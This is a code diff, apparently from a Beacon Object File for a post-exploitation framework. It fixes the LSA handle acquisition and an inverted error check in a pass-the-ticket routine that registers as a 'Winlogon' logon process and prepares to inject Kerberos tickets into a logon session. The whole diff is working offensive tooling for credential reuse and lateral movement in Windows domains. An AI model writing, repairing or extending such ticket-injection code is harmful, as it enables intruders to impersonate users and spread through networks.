@@ -106,18 +106,16 @@ BOOL IsSystem(HANDLE TokenHandle) {
 }
 
 BOOL GetLsaHandle(HANDLE hToken, BOOL highIntegrity, HANDLE* hLsa) {
-    HANDLE hLsaLocal = NULL;
+    NTSTATUS status;
     ULONG  mode = 0;
-    bool   status = true;
     if (highIntegrity) {
         STRING lsaString = (STRING){ .Length = 8, .MaximumLength = 9, .Buffer = "Winlogon" };
-        status = SECUR32$LsaRegisterLogonProcess(&lsaString, &hLsaLocal, &mode);
+        status = SECUR32$LsaRegisterLogonProcess(&lsaString, hLsa, &mode);
     }
     else {
-        status = SECUR32$LsaConnectUntrusted(&hLsaLocal);
+        status = SECUR32$LsaConnectUntrusted(hLsa);
     }
-    *hLsa = hLsaLocal;
-    return status;
+    return NT_SUCCESS(status);
 }
 
 int my_isdigit(int c) {
@@ -194,7 +192,10 @@ void PTT(char* luid, byte* ticket) {
         IsHighIntegrity = false;
 
     HANDLE hLsa;
-    if (GetLsaHandle(hToken, IsHighIntegrity, &hLsa)) return;
+    if (!GetLsaHandle(hToken, IsHighIntegrity, &hLsa)) {
+        PRINT_OUT("[X] Failed to get LSA handle.\n");
+        return;
+    }
 
     ULONG authPackage;
     LSA_STRING krbAuth = { .Buffer = "kerberos",.Length = 8,.MaximumLength = 9 };
